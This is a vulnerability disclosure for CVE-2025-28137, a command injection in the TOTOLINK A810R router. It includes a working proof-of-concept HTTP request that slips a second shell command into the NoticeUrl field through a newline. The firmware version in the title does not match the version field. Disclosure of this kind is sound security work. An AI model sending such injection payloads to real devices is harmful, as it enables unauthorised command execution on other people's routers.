# RCE-TOTOLINK-V4.1.2cu.5137_B20200730

system.so-setNoticeCfg-NoticeUrl

## CVE-ID
CVE-2025-28137

## PRODUCT

TOTOLINK

## Vendor of Product

https://www.totolink.net/

## VERSION

A810R V4.1.2cu.5182_B20201026

## Firmware

https://www.totolink.net/home/menu/detail/menu_listtpl/download/id/169/ids/36.html

## Vulnerability Type

RCE

## Description

The TOTOLINK A810R V4.1.2cu.5182_B20201026 were found to contain a pre-auth remote command execution vulnerability in the setNoticeCfg function through the NoticeUrl parameter.

The NoticeUrl is user-controllable. The GetDomainName function extracts the domain part from the URL and assigns it to v36. Subsequently, it enters the validity_check function to verify whether special characters are present. If special characters are included, it directly returns.

This function can be bypassed using newline characters, and `\n` can be used in JSON data to achieve this.
![image](https://github.com/user-attachments/assets/eebb14e8-ca78-434c-a130-ac0d1b0f097e)
If no special characters are included, the process continues and triggers the system function.
![image](https://github.com/user-attachments/assets/df5ea963-a1b6-4a2d-a1aa-8d990f88ba01)
![image](https://github.com/user-attachments/assets/aee8a1b8-b272-4d33-9a1b-c1c01790a2f5)
## POC
```
POST /cgi-bin/cstecgi.cgi HTTP/1.1

Host: 192.168.0.1

User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0

Accept: */*

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate, br

Content-Type: application/x-www-form-urlencoded; charset=UTF-8

X-Requested-With: XMLHttpRequest

Content-Length: 135

Origin: http://192.168.0.1

Connection: keep-alive

Referer: http://192.168.0.1/firewall/url_filtering.asp?timestamp=1740669963073

Cookie: SESSION_ID=2:1604139547:2



{"topicurl":"setting/setNoticeCfg","NoticeUrl":"bbb\nls>/test\nbb.com","WhiteListUrl1":"1111",

"IpFrom":"123.123.123.0","IpTo":"aaaa"}
```
![image](https://github.com/user-attachments/assets/a9764c05-cadb-4256-8c9b-701e6676b65e)



